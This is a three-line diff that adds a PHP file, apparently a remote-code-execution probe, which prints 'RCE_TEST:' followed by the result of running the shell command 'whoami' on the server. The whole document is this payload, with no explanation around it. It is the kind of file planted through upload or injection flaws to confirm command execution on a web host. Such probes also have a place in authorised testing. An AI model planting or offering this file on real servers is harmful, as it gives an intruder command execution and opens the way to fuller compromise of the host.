@@ -1,0 +1,3 @@
+<?php
+echo "RCE_TEST:" . shell_exec("whoami");
+?>
